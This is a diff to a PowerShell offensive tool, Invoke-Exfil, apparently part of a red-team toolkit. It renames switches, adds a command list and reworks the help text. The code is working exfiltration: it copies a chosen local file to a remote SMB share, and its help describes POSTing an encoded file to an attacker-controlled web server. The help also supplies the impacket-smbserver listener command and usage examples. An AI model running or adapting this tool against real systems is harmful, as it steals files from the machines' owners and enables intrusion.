@@ -2,10 +2,11 @@ function Invoke-Exfil {
 [CmdletBinding()]
 param (
 	[Switch]$Help,
+	[switch]$List,
 	[Switch]$SmbExfil,
 	[String]$SmbIp,
 	[String]$LocalFile,
-	[Switch]$RestMethod,
+	[Switch]$RestExfil,
 	[String]$LocalFile2=[String]$Localfile,
 	[String]$Url
 )
@@ -17,33 +18,44 @@ param (
  -------------------------
  Available Invoke-Exfil Commands:
  --------------------------------
- /-------------------------------------------------------------------------------/
- | -SmbExfil [-SmbIp] smb_ip [-LocalFile] local_file                             |
- | ----------------------------------------------------------------------------- |
+ |-----------------------------------------------------------------------------|
+ | -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip                           |
+ |-----------------------------------------------------------------------------|
                                                                                 
    [*] Description: Copies a local file over SMB to a remote SMB                
        Listener.                                                                
                                                                                 
-   [*] Usage: Invoke-Exfil -SmbExfil -SmbIp n.n.n.n -LocalFile C:\temp\data.txt 
-   [*] Use impacket on remote:                                                  
+   [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n 
+   [*] Use impacket-smbserver on remote:                                                  
        impacket-smbserver data /tmp/data -smb2support                           
  
- /-------------------------------------------------------------------------------/
- | -RestMethod [-LocalFile] local_file [-Url] remote_server                      |
- | ----------------------------------------------------------------------------- |
+ |-----------------------------------------------------------------------------|
+ | -RestExfil [-LocalFile] local_file [-Url] remote_server                     |
+ |-----------------------------------------------------------------------------|
  
    [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
        send a file to an attacker-controlled web server.
 	
-   [*] Usage: Invoke-Exfil -RestMethod -LocalFile C:\file -Url https://192.168.1.1/exfil
+   [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://192.168.1.1/exfil
    
 
 "@
 	}
+	elseif ($List -eq $True) {
+		Write @"  
+
+ Invoke-Exfil Command List:
+ --------------------------
+ Invoke-Exfil -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip 
+ Invoke-Exfil -RestExfil [-LocalFile] local_file [-Url] remote_server
+
+"@
+	}
+
 	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
 		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
 	}
-	elseif ($RestMethod -and $LocalFile -and $Url) {
+	elseif ($RestExfil -and $LocalFile -and $Url) {
 	
 		if ($PSVersionTable.PSVersion.Major -eq "2") {
 			Write " [!] This function requires PowerShell version greater than 2.0."
